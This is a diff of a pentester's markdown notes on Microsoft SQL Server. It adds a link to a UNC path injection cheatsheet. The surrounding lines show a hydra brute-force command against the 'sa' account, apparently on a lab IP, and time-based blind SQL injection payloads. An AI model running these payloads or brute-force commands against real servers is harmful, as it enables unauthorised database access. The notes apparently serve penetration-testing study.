@@ -1,7 +1,9 @@
 # Databases - SqlServer
+
 ## Quick Reference 
 
 - mssql-sql-injection-cheat-sheet: <http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet>
+- SQL Server UNC Path Injection Cheatsheet: <https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e>
 
 - Brute-forcing: `hydra -l sa –P /path/to/rockyou.txt 10.10.10.125 mssql`
 - Nmap Enumeration:
@@ -43,6 +45,7 @@
     ' if (select user) = 'sa' waitfor delay '0:0:5'--
     ' if (select user) != 'sa' waitfor delay '0:0:5'--
     ```
+
 ## Tools 
 
 - SQSH
